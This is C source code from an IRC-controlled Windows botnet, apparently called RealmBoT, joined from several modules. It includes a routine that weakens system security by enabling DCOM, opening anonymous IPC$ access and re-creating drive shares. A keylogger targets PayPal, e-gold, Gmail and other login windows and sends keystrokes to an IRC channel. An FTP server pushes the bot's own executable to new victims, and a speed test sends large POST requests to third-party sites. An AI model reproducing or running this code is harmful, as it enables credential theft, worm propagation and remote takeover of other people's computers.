				for(int i=0;i < (sizeof(ShareList) / sizeof (NetShares));i++) {
					if(ShareDel(NULL,ShareList[i].ShareName) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (secure.p.l.g) .»».  Share '%s' deleted.",ShareList[i].ShareName);
					else
						_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (secure.p.l.g) .»».  Failed to delete '%s' share.",ShareList[i].ShareName);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
					addlog(sendbuf);
				}
			}
		} while (nStatus == ERROR_MORE_DATA);
		sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Network shares deleted.");
	} else
		sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Netapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	return TRUE;
}

BOOL UnSecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (!noadvapi32) {
		HKEY hKey;
		if(fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			TCHAR szDataBuf[]="Y";
			if(fRegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
				sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Enable DCOM failed.");
			else
				sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  DCOM enabled.");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Failed to open DCOM registry key.");
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		if (fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			DWORD dwData = 0x00000000;
			if (fRegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Failed to unrestrict access to the IPC$ Share.");
			else
				sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Unrestricted access to the IPC$ Share.");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Failed to open IPC$ restriction registry key.");
	} else
		sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Advapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
	addlog(sendbuf);

	if (!nonetapi32) {
		for(int i=0;i < ((sizeof(ShareList) / sizeof (NetShares)) - 2);i++) {
			if(ShareAdd(NULL,ShareList[i].ShareName,ShareList[i].SharePath) == NERR_Success)
				_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (secure.p.l.g) .»».  Share '%s' added.",ShareList[i].ShareName);
			else
				_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (secure.p.l.g) .»».  Failed to add '%s' share.",ShareList[i].ShareName);
			if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
			addlog(sendbuf);
		}

		char sharename[10], sharepath[10];
		DWORD dwDrives = GetLogicalDrives();
		for(char cDrive='A'; dwDrives!=0; cDrive++, dwDrives=(dwDrives>>1)) {
			if((dwDrives & 1)==1 && cDrive != 'A') {
				_snprintf(sharename,sizeof(sharename),"%c$",cDrive);
				_snprintf(sharepath,sizeof(sharepath),"%c:\\",cDrive);

				if (fGetDriveType(sharepath) == DRIVE_FIXED) {
					if(ShareAdd(NULL,sharename,sharepath) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (secure.p.l.g) .»».  Share '%s' added.",sharename);
					else
						_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (secure.p.l.g) .»».  Failed to add '%s' share.",sharename);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
					addlog(sendbuf);
				}
			}
		}

		sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Network shares added.");
	} else
		sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Netapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	return TRUE;
}

#ifndef NO_SECSYSTEM
DWORD WINAPI AutoSecure(LPVOID param)
{
	while (1) {
		SecureSystem(0,NULL,FALSE,TRUE);
		Sleep(secure_delay);
	}
	ExitThread (0);
}
#endif
#ifndef NO_WILDCARD

int wildcardfit(char *wildcard, char *test)
{
	int fit = 1;

	for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++) {
		switch (*wildcard) {
		case '[':
			wildcard++;
			fit = set (&wildcard, &test);
			break;
		case '?':
			test++;
			break;
		case '*':
			fit = asterisk (&wildcard, &test);
			wildcard--;
			break;
		default:
			fit = (int) (*wildcard == *test);
			test++;
		}
	}
	while ((*wildcard == '*') && (1 == fit))
		wildcard++;

	return ((int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard)));
}

int set(char **wildcard, char **test)
{
	int fit = 0, negation = 0, at_beginning = 1;

	if ('!' == **wildcard) {
		negation = 1;
		(*wildcard)++;
	}
	while ((']' != **wildcard) || (1 == at_beginning)) {
		if (0 == fit) {
			if (('-' == **wildcard) && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
				&& (']' != *(*wildcard + 1)) && (0 == at_beginning)) {
				if (((**test) >= (*(*wildcard - 1))) && ((**test) <= (*(*wildcard + 1)))) {
					fit = 1;
					(*wildcard)++;
				}
			}
			else if ((**wildcard) == (**test))
              fit = 1;
		}
		(*wildcard)++;
		at_beginning = 0;
	}
	if (1 == negation)
		fit = 1 - fit;
	if (1 == fit)
		(*test)++;

	return (fit);
}

int asterisk(char **wildcard, char **test)
{
	int fit = 1;

	(*wildcard)++;
	while (('\000' != (**test)) && (('?' == **wildcard) || ('*' == **wildcard))) {
		if ('?' == **wildcard)
			(*test)++;
		(*wildcard)++;
	}
	while ('*' == (**wildcard))
		(*wildcard)++;

	if (('\0' == (**test)) && ('\0' != (**wildcard)))
		return (fit = 0);
	if (('\0' == (**test)) && ('\0' == (**wildcard)))
		return (fit = 1);
	else {
		if (0 == wildcardfit(*wildcard, (*test))) {
			do {
				(*test)++;
				while (((**wildcard) != (**test)) && ('['  != (**wildcard)) && ('\0' != (**test)))
					(*test)++;
			} while ((('\0' != **test))?(0 == wildcardfit ((char *)*wildcard, (*test))):(0 != (fit = 0)));
		}
		if (('\0' == **test) && ('\0' == **wildcard))
			fit = 1;
		return (fit);
	}
}
#endif


	#ifndef NO_CRYPT
	char buffer[512];
	int i;
	for (i=0;i<copyfilesize;i++) {
		_snprintf(buffer, sizeof(buffer), copyfiles[i]);
		Crypt((unsigned char *)buffer, strlen(buffer),NULL,0);
		copyfiles[i]=buffer;
	}
	for (i=0;i<copyextsize;i++) {
		_snprintf(buffer, sizeof(buffer), copyfiles[i]);
		Crypt((unsigned char *)buffer, strlen(buffer),NULL,0);
		copyexts[i]=buffer;
	}
	#endif
	


#ifndef NO_SPEEDTEST

#define NUM_KILOBYTES 200

// Return speed to host:80 in kbit per second

unsigned long GetSpeed(char *szHost) {
	if(strlen(szHost) > MAXHOSTNAME) return 0;
	unsigned long lBufSize=NUM_KILOBYTES*1024;
	SOCKET sSock;
	SOCKADDR_IN ssin;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	if ((ssin.sin_addr.s_addr = ResolveAddress(szHost)) == INADDR_NONE) return 0;
	ssin.sin_port = fhtons(80);

	if ((sSock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) return 0;
	if (fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) return 0;

	char *szBuf=(char*)malloc(lBufSize+3);

	srand(GetTickCount());
	int iChar=(char)(randnum(255));
	memset(szBuf,	0,		lBufSize+1	);
	memset(szBuf,	iChar,	lBufSize	);

	unsigned long lStrLen=strlen(szBuf);

	char *szPostReq=(char*)malloc(lBufSize+1002);
	sprintf(szPostReq, "POST / HTTP/1.0\r\n"
		"Host: %s\r\n"
		"Content-Length: %d\r\n"
		"\r\n",
		szHost, lStrLen);
	strcat(szPostReq, szBuf);
	strcat(szPostReq, "\r\n");
	
	lStrLen=strlen(szPostReq);

	unsigned long lStartMS=GetTickCount();

	for(unsigned long l=0; l<lStrLen; l+=1024) {
		if(lStrLen-l < 1024) {
			if(fsend(sSock, szPostReq+l, lStrLen-l,0) == SOCKET_ERROR) { 
				fclosesocket(sSock);
				free(szBuf); 
				free(szPostReq);
				return 0; 
			}
		} else {
			if(fsend(sSock, szPostReq+l, 1024,0) == SOCKET_ERROR) { 
				fclosesocket(sSock);
				free(szBuf); 
				free(szPostReq);
				return 0; 
			}
		}
	}

	unsigned long lEndMS=GetTickCount();

	float fElapsedS=(float)(lEndMS-lStartMS)/1000.0f;
	if(fElapsedS==0.0f) fElapsedS=1.0f;

	float fBytesPS=(float)lStrLen/fElapsedS;	// Get bytes per second
	float fKBytesPS=fBytesPS/1024.0f;			// Get kilobytes per second
	float fBitsPS=fBytesPS*8.0f;				// Get bits per second
	float fKBitsPS=fBitsPS/1024.0f;				// Get kilobits per se

	fclosesocket(sSock);
	free(szBuf); 
	free(szPostReq);

	return (unsigned long)fKBitsPS;
}

void DoSpeedTest(SOCKET sock, char *chan, bool notice) {
	unsigned long lProbe1=0, lProbe2=0;
	int iDivide=3;
	char sendbuf[IRCLINE];

	char *EU[] = {
		"www.schlund.net",
		"www.utwente.nl",
		"verio.fr",
		"www.1und1.de",
		"www.switch.ch",
		"www.belwue.de",
		"de.yahoo.com"
	};
	char *US[] = {
		"www.xo.net",
		"www.stanford.edu",
		"www.verio.com",
		"www.nocster.com",
		"www.rit.edu",
		"www.cogentco.com",
		"www.burst.net",
		"nitro.ucsc.edu",
		"www.level3.com",
		"www.above.net",
		"www.easynews.com",
		"www.google.com"
	};
	char *ASIA[] = {
		"www.lib.nthu.edu.tw",
		"www.st.lib.keio.ac.jp",
		"www.d1asia.com",
		"www.nifty.com",
		"yahoo.co.jp"
	};

	// EU
	lProbe1=GetSpeed(EU[randnum(sizeof(EU)/sizeof(EU[0]))]);
	lProbe2=GetSpeed(EU[randnum(sizeof(EU)/sizeof(EU[0]))]);
	unsigned long lEUSpeed=0;
	if (lProbe1 && lProbe2) lEUSpeed=(lProbe1+lProbe2)/2;
	else { if (lProbe1) lEUSpeed=lProbe1; else lEUSpeed=lProbe2; }

	// US
	unsigned long lUSSpeed=0;
	lProbe1=GetSpeed(US[randnum(sizeof(US)/sizeof(US[0]))]);
	lProbe2=GetSpeed(US[randnum(sizeof(US)/sizeof(US[0]))]);
	if (lProbe1 && lProbe2) lUSSpeed=(lProbe1+lProbe2)/2;
	else { if (lProbe1) lUSSpeed=lProbe1; else lUSSpeed=lProbe2; }

	// ASIA
	lProbe1=GetSpeed(ASIA[randnum(sizeof(ASIA)/sizeof(ASIA[0]))]);
	lProbe2=GetSpeed(ASIA[randnum(sizeof(ASIA)/sizeof(ASIA[0]))]);
	unsigned long lASIASpeed=0;
	if (lProbe1 && lProbe2) lASIASpeed=(lProbe1+lProbe2)/2;
	else { if (lProbe1) lASIASpeed=lProbe1; else lASIASpeed=lProbe2; }

	if (!lEUSpeed && !lUSSpeed && !lASIASpeed) return;

	unsigned long lTotalSpeed=0;
	if (lEUSpeed) lTotalSpeed=lEUSpeed; else iDivide--;
	if (lUSSpeed) lTotalSpeed+=lUSSpeed; else iDivide--;
	if (lASIASpeed) lTotalSpeed+=lASIASpeed; else iDivide--;
	lTotalSpeed/=iDivide;

	sprintf(sendbuf, "[SPEEDTEST]: Europe[%d kbit/s] USA[%d kbit/s] Asia[%d kbit/s] Average[%d kbit/s]",
					lEUSpeed, lUSSpeed, lASIASpeed, lTotalSpeed);
	irc_privmsg(sock, chan, sendbuf, notice);
	addlog(sendbuf);

	return;
}
#endif



#ifndef NO_KEYLOG

SYTES sytes[]={
	"e-gold",
	"PayPal",
    "StormPay",
	"WorldPay",
	"Fotolog.net",
	"Terra - Fotolog",
	"Yahoo!",
	"Domain Search",
	"Bienvenido a Gmail",
	"Welcome to Gmail",
	"Domain Name Registration",
	"Domain Name",
	"My Account Login",
	"MercadoLivre Brasil",
	"Iniciar sesión"
};

KEYS keys[]={
	{8,"b","b"},
	{13,"e","e"},
	{27,"[ESC]","[ESC]"},
	{112,"[F1]","[F1]"},
	{113,"[F2]","[F2]"},
	{114,"[F3]","[F3]"},
	{115,"[F4]","[F4]"},
	{116,"[F5]","[F5]"},
	{117,"[F6]","[F6]"},
	{118,"[F7]","[F7]"},
	{119,"[F8]","[F8]"},
	{120,"[F9]","[F9]"},
	{121,"[F10]","[F10]"},
	{122,"[F11]","[F11]"},
	{123,"[F12]","[F12]"},
	{192,"`","~"},
	{49,"1","!"},
	{50,"2","@"},
	{51,"3","#"},
	{52,"4","$"},
	{53,"5","%"},
	{54,"6","^"},
	{55,"7","&"},
	{56,"8","*"},
	{57,"9","("},
	{48,"0",")"},
	{189,"-","_"},
	{187,"=","+"},
	{9,"[TAB]","[TAB]"},
	{81,"q","Q"},
	{87,"w","W"},
	{69,"e","E"},
	{82,"r","R"},
	{84,"t","T"},
	{89,"y","Y"},
	{85,"u","U"},
	{73,"i","I"},
	{79,"o","O"},
	{80,"p","P"},
	{219,"[","{"},
	{221,"","}"},
	{65,"a","a"},
	{83,"s","S"},
	{68,"d","D"},
	{70,"f","F"},
	{71,"g","G"},
	{72,"h","H"},
	{74,"j","J"},
	{75,"k","K"},
	{76,"l","L"},
	{186,";",":"},
	{222,"'","\""},
	{90,"z","Z"},
	{88,"x","X"},
	{67,"c","C"},
	{86,"v","V"},
	{66,"b","B"},
	{78,"n","N"},
	{77,"m","M"},
	{188,",","<"},
	{190,".",">"},
	{191,"/",".?"},
	{220,"\\","|"},
	{17,"[CTRL]","[CTRL]"},
	{91,"[WIN]","[WIN]"},
	{32," "," "},
	{92,"[WIN]","[WIN]"},
	{44,"[PRSC]","[PRSC]"},
	{145,"[SCLK]","[SCLK]"},
	{45,"[INS]","[INS]"},
	{36,"[HOME]","[HOME]"},
	{33,"[PGUP]","[PGUP]"},
	{46,"[DEL]","[DEL]"},
	{35,"[END]","[END]"},
	{34,"[PGDN]","[PGDN]"},
	{37,"[LEFT]","[LEFT]"},
	{38,"[UP]","[UP]"},
	{39,"[RGHT]","[RGHT]"},
	{40,"[DOWN]","[DOWN]"},
	{144,"[NMLK]","[NMLK]"},
	{111,"/","/"},
	{106,"*","*"},
	{109,"-","-"},
	{107,"+","+"},
	{96,"0","0"},
	{97,"1","1"},
	{98,"2","2"},
	{99,"3","3"},
	{100,"4","4"},
	{101,"5","5"},
	{102,"6","6"},
	{103,"7","7"},
	{104,"8","8"},
	{105,"9","9"},
	{110,".","."}
};

int SaveKeys(char *key, char *windowtxt, KEYLOG keylog)
{
	char sendbuf[IRCLINE];
	
	if(keylog.mode)
	{
		for(int i=0;i < sizeof(sytes) / sizeof(SYTES);i++)
		{
			if(strstr(windowtxt, sytes[i].title))
			{
				_snprintf(sendbuf,sizeof(sendbuf),"%s (%s)", key, sytes[i].title);
				irc_privmsg(keylog.sock,keylog.chan,sendbuf,keylog.notice);
			}
		}
	}else {
		_snprintf(sendbuf,sizeof(sendbuf),"%s", key);
		irc_privmsg(keylog.sock,keylog.chan,sendbuf,keylog.notice);
	}

	return 0;
}

DWORD WINAPI KeyLoggerThread(LPVOID param)
{
	KEYLOG keylog = *((KEYLOG *)param);
	KEYLOG *keylogs = (KEYLOG *)param;
	keylogs->gotinfo = TRUE;

	char buffer[IRCLINE], buffer2[IRCLINE], windowtxt[61], mwindowtxt[61];
    
	int err = 0, x = 0, i = 0, state, shift, bKstate[256]={0};
    
	HWND active = fGetForegroundWindow(), mactive;
	HWND old = active;
	
	
	fGetWindowText(old,windowtxt,60);

	while (err == 0) {
		Sleep(8);
		
		active = fGetForegroundWindow();
		
		if (active != old) {
			old = active;
			fGetWindowText(old,windowtxt,60);

			if(keylog.mode)
			{
				if((strlen(buffer)) > 0 && (strlen(windowtxt)) < 1)
				{
					sprintf(buffer2, ".».%s.«.", buffer); 
					err = SaveKeys(buffer2, windowtxt, keylog);
					memset(buffer,0,sizeof(buffer));
					memset(buffer2,0,sizeof(buffer2));
				}
				if((strlen(buffer)) > 0 && (strlen(windowtxt)) > 0)
				{
					sprintf(buffer2, ".».%s.«.", buffer); 
					err = SaveKeys(buffer2, windowtxt, keylog);
					memset(buffer,0,sizeof(buffer));
					memset(buffer2,0,sizeof(buffer2));
				}
			}
			else if ((strlen(windowtxt)) > 0) {
				sprintf(buffer2, ".».%s.«. (Changed Windows: %s)", buffer, windowtxt); 
				err = SaveKeys(buffer2, windowtxt, keylog);
				memset(buffer,0,sizeof(buffer));
				memset(buffer2,0,sizeof(buffer2));
			}
		}
		
		// let make magic...
		if(keylog.mode)
		{
			if((fGetAsyncKeyState(VK_LBUTTON)) == -32767 && (strlen(buffer)) > 0) {
				mactive = fGetForegroundWindow();
				fGetWindowText(mactive,mwindowtxt,60);
				
				sprintf(buffer2, ".».%s.«.", buffer); 
				err = SaveKeys(buffer2, mwindowtxt, keylog);
				memset(buffer,0,sizeof(buffer));
				memset(buffer2,0,sizeof(buffer2));
			}
		}
		
		for (i = 0; i < 92; i++) {
			shift = fGetKeyState(VK_SHIFT);
            
			x = keys[i].inputL;

			if (fGetAsyncKeyState(x) & 0x8000) {
				if (((fGetKeyState(VK_CAPITAL)) && (shift > -1) && (x > 64) && (x < 91)))//caps lock and NOT shift
					bKstate[x] = 1; /* upercase a-z */
				else if (((fGetKeyState(VK_CAPITAL)) && (shift < 0) && (x > 64) && (x < 91)))//caps lock AND shift
					bKstate[x] = 2; /* lowercase a-z */
				else if (shift < 0) /* shift */
					bKstate[x] = 3; /* upercase */
				else bKstate[x] = 4; /* lowercase */
			} else {
				if (bKstate[x] != 0) {
					state = bKstate[x];
					bKstate[x] = 0;
	
					if (x == 8) {
						buffer[strlen(buffer)-1] = 0;
						continue;
					
					} else if (strlen(buffer) > 511 - 70) {
						active = fGetForegroundWindow();
						fGetWindowText(active,windowtxt,60);
						if(keylog.mode)
							sprintf(buffer2,".».%s.«. (Buffer full)",buffer);
						else
							sprintf(buffer2,".».%s.«. (Buffer full) (%s)",buffer,windowtxt);
						err = SaveKeys(buffer2, windowtxt, keylog);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));

						continue;
					
					} else if (x == 13) {
						if (strlen(buffer) == 0) 
							continue;
						
						active = fGetForegroundWindow();
						fGetWindowText(active,windowtxt,60);
						if(keylog.mode)
							sprintf(buffer2,".».%s.«. (Return)",buffer);
						else
							sprintf(buffer2,".».%s.«. (Return) (%s)",buffer,windowtxt);
						err = SaveKeys(buffer2, windowtxt, keylog);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));

						continue;
					} else if (state == 1 || state == 3)
						strcat(buffer,keys[i].outputH);
					else if (state == 2 || state == 4) 
						strcat(buffer,keys[i].outputL);
				}
			}
		}
	}
	clearthread(keylog.threadnum);

	ExitThread(0);
}
#endif

#ifndef NO_FTPD

#include "headers/random.h"

#pragma warning(disable : 4018)
#pragma comment(lib, "ws2_32")

SOCKET data_sock;

int ftp_Data_connect(char *ip,int port);
int Ftp_data_transfer();
int	FTP_PORT;
int ftp_sends=0;
extern	SOCKET sock;

DWORD WINAPI ftpd(LPVOID pParam) {

	WSADATA wsdata;
	SOCKET listener;
	SOCKET newfd;

	char sendbuf[IRCLINE];
	struct sockaddr_in server_address;
	struct sockaddr_in remoteaddr;
	long h;
	int reuse_addr = 1;
	unsigned long mode = 1;
	int fdmax;
	int i;
	int addrlen;
	int nbytes;

	char buf[100];
//	char t_buf[1024];
	char tmpbuf[100];
	char tmpbuf2[100];
	char a[4];
	char b[4];
	char c[4];
	char d[4];
	char p1[50];
	char p2[50];
	char tmpip[15];
	int po,po2;

	FTP ftp = *((FTP *)pParam);
	FTP *ftps = (FTP *)pParam;
	ftps->gotinfo = TRUE;

	struct fd_set master;   // master file descriptor list
	struct fd_set read_fds; // temp file descriptor list for select()

	FD_ZERO(&master);    // clear the master and temp sets
	FD_ZERO(&read_fds);

	WSAStartup(0x0101, &wsdata);

//	FTP_PORT = lsaport;

	listener = socket(AF_INET, SOCK_STREAM, 0);
	setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse_addr,sizeof(reuse_addr));
	ioctlsocket(listener, FIONBIO, &mode);

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = INADDR_ANY;
	server_address.sin_port = htons(FTP_PORT);

	if (bind(listener, (struct sockaddr *) &server_address,sizeof(server_address)) < 0 ) {
		return 1;
	}

	listen(listener,10);

	FD_SET(listener, &master);

	fdmax = listener;


	while(1) {
		read_fds = master;
		if (select(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
			return 1;
    	}
		for(i = 0; i <= fdmax; i++) {
			memset(buf,0,sizeof(buf));
			memset(tmpbuf,0,sizeof(tmpbuf));
			if (FD_ISSET(i, &read_fds)) {
				if (i == (int)listener) {
					addrlen = sizeof(remoteaddr);
					if ((newfd = accept(listener, (struct sockaddr *)&remoteaddr,&addrlen)) != -1) {
						FD_SET(newfd, &master);
						if ((int)newfd > fdmax) {
							fdmax = newfd;
						}
					send(newfd, "220 TxmxFtpd 0wns j0\n",21 , 0);
					}
				} else {
					if ((nbytes = recv(i, buf, sizeof(buf), 0)) <= 0) {
						FD_CLR(i, &master);
						closesocket(i);
					} else {
						sscanf(buf,"%s %s",tmpbuf,tmpbuf2);
						if (strcmp(tmpbuf,"USER") == 0) {
							send(i,"331 Password required\n",22 , 0);
						}
						else if (strcmp(tmpbuf,"PASS") == 0) {
							send(i,"230 User logged in.\n",20 , 0);
						}
						else if (strcmp(tmpbuf,"SYST") == 0) {
							send(i,"215 NzmxFtpd\n",13 , 0);
						}
						else if (strcmp(tmpbuf,"REST") == 0) {
							send(i,"350 Restarting.\n",16 , 0);
						}
						else if (strcmp(tmpbuf,"PWD") == 0) {
							send(i,"257 \"/\" is current directory.\n",30 , 0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"A") == 0)) {
							send(i,"200 Type set to A.\n",19 , 0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"I") == 0)) {
							send(i,"200 Type set to I.\n",19 , 0);
						}
						else if (strcmp(tmpbuf,"PASV") == 0) {
							char pasv[] = "425 Passive not supported on this server\n";
							send(i, pasv, strlen(pasv), 0);
						}
						else if (strcmp(tmpbuf,"LIST") == 0) {
							char list[] = "226 Transfer complete\n";
							send(i, list, strlen(list), 0);
						}
						else if (strcmp(tmpbuf,"PORT") == 0) {
							sscanf(buf,"%*s %[^,],%[^,],%[^,],%[^,],%[^,],%[^\n]",a,b,c,d,p1,p2);
							po = atoi(p1);
							po2 = atoi(p2);
							memset(p1,0,sizeof(p1));
							sprintf(p1,"%x%x\n",po,po2);
							h = strtoul(p1, NULL, 16);
							sprintf(tmpip,"%s.%s.%s.%s",a,b,c,d);
							send(i,"200 PORT command successful.\n",29 , 0);

						}
						else if (strcmp(tmpbuf,"RETR") == 0) {
							send(i,"150 Opening BINARY mode data connection\n",40 , 0);
							if(ftp_Data_connect(tmpip,(int)h) == 1) {
								if (Ftp_data_transfer() == 1) {
									send(i,"226 Transfer complete.\n",23 , 0);
									sprintf(sendbuf,"[REALMBOT-FTP] %s, port:%d now executing %s on remote machine.",tmpip,FTP_PORT,ftp.filename);
									ftp_sends++;
									if (!ftp.silent) irc_privmsg(ftp.sock,ftp.chan,sendbuf,ftp.notice);
								}
							} else {
								send(i,"425 Can't open data connection.\n",32,0);
							}
						}
						else if (strcmp(tmpbuf,"QUIT") == 0) {
							send(i,"221 Goodbye happy r00ting.\n",27 , 0);
						}
						memset(buf,0,sizeof(buf));
					}
				}
			}
		}
	}
	return 1;
}

int ftp_Data_connect(char *ip,int port)
{
	struct	sockaddr_in	server;
	WSADATA wsdata;

	WSAStartup(0x0101, &wsdata);

	data_sock = socket(AF_INET, SOCK_STREAM, 0);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);

	if (connect(data_sock,(struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
		closesocket(data_sock);
		WSACleanup();
		return 0;
	}
	return 1;
}

int Ftp_data_transfer() {
	FILE * fid;
	char myfname[MAX_PATH];
	unsigned char buffer[1024];
	GetModuleFileName(NULL,myfname,sizeof(myfname));

	fid = fopen(myfname, "rb");
	if (!fid) { return 0; }

	while(!feof(fid))
	{
		fread(&buffer, sizeof(buffer), 1, fid);
		send(data_sock, (const char*)buffer, sizeof(buffer), 0);
		Sleep(1);
	}
	fclose(fid);
	closesocket(data_sock);
	WSACleanup();
	return 1;
}

#endif


#ifndef NO_HTTPD

DWORD WINAPI HTTP_Server_Thread(LPVOID param)
{
	HTTPD httpd = *((HTTPD *)param);
	HTTPD *httpds = (HTTPD *)param;
	httpds->info = TRUE;

	char sendbuf[IRCLINE], buffer[4096], rBuffer[4096], file[MAX_PATH], *file_to_send = "\0";

	int gsin_len;
    unsigned int i,r,b, max;
	unsigned long mode = 1;

	SOCKET gsock, ssock;
	SOCKADDR_IN  gsin, ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)httpd.port);
	ssin.sin_addr.s_addr = INADDR_ANY;

	if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		threads[httpd.threadnum].sock = ssock;
		if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (flisten(ssock, SOMAXCONN) != SOCKET_ERROR) {
				if (fioctlsocket(ssock,FIONBIO,&mode) != SOCKET_ERROR) {

					fd_set master, temp;
					FD_ZERO(&master);
					FD_ZERO(&temp);
					FD_SET(ssock, &master);
					max = ssock;

					while (1) {
						temp = master;
						if (fselect(max+1, &temp, NULL, NULL, NULL) == SOCKET_ERROR)
							break;

						for(i=0; i <= max; i++) {
							if (fFD_ISSET(i, &temp)) { //there is somthing to do
								if (i == ssock) {
									//there is a new connection request
									gsin_len = sizeof(gsin);

									if ((gsock = faccept(ssock, (LPSOCKADDR)&gsin, &gsin_len)) == INVALID_SOCKET)
										continue;
									else {
										FD_SET(gsock, &master); // add to master set
										if (gsock > (unsigned int)max)
											max = gsock;
									}
								} else {
    								memset(buffer,0,sizeof(buffer));
									memset(rBuffer,0,sizeof(rBuffer));
									if (frecv(i, buffer, sizeof(buffer), 0) <= 0) { //socket error
										fclosesocket(i);
										FD_CLR(i, &master); // remove from master set
									} else {
										memset(file,0,sizeof(file));
										for (b=0,r=0; b<strlen(buffer); b++,r++) {
											rBuffer[r] = buffer[b];
											if (buffer[b] == '\n') {  //check the request....
												if (strstr(rBuffer,"GET ") != NULL && strlen(rBuffer) > 5) { //look for a GET request
													file_to_send = strtok(strstr(strstr(rBuffer,"GET ")," ")," ");
													strcpy(file,file_to_send);
												} else if (strcmp(rBuffer,"\r\n") == 0) {  //end of the request check if there is anything to send back
													FD_CLR(i, &master);
													if (file != NULL) {
														if (strlen(file)+strlen(httpd.dir) < MAX_PATH) {
															unsigned long mode2 = 0;
															fioctlsocket(i,FIONBIO,&mode2);
															Check_Requested_File(i,httpd.dir,file,httpd.enabled,httpd.threadnum);
														} else
															fclosesocket(i);
													} else
														fclosesocket(i);
													break;
												}
												memset(rBuffer,0,sizeof(rBuffer));
												r=-1;
											}
										}
									}
								}
							}
                		}
        			}
				}
			}
		}
	}

	sprintf(sendbuf, "RealmBoT (httpd.p.l.g) .»».  Error: server failed, returned: <%d>.", fWSAGetLastError());
	if (!httpd.silent) irc_privmsg(httpd.sock, httpd.chan, sendbuf, httpd.notice);
	addlog(sendbuf);

	fclosesocket(ssock);
	clearthread(httpd.threadnum);

	ExitThread(0);
}

DWORD WINAPI HTTP_Header(LPVOID param)
{
	HTTPD httpd = *((HTTPD *)param);
	HTTPD *httpds = (HTTPD *)param;
	httpds->info = TRUE;

	char tFile[MAX_PATH], nFile[MAX_PATH], content[50], buffer[4096], date[70], time[30];

	sprintf(tFile,httpd.file);
	sprintf(nFile,httpd.path);

	if (httpd.type)
		sprintf(content,"text/html");
	else
		sprintf(content,"application/octet-stream");

	GetDateFormat(0x409,0,0,"ddd, dd MMM yyyy",date,70);
	GetTimeFormat(0x409,0,0,"HH:mm:ss",time,30);

	if (httpd.length == -1)
		sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: myBot\r\nCache-Control: no-cache,no-store,max-age=0\r\npragma: no-cache\r\nContent-Type: %s\r\nAccept-Ranges: bytes\r\nDate: %s %s GMT\r\nLast-Modified: %s %s GMT\r\nExpires: %s %s GMT\r\nConnection: close\r\n\r\n",content,date,time,date,time,date,time);
	else
		sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: myBot\r\nCache-Control: no-cache,no-store,max-age=0\r\npragma: no-cache\r\nContent-Type: %s\r\nContent-Length: %i\r\nAccept-Ranges: bytes\r\nDate: %s %s GMT\r\nLast-Modified: %s %s GMT\r\nExpires: %s %s GMT\r\nConnection: close\r\n\r\n",content,httpd.length,date,time,date,time,date,time);
	fsend(httpd.sock,buffer,strlen(buffer),0);

	if (httpd.type == FALSE)
		HTTP_Send_File(httpd.sock,tFile);
	else
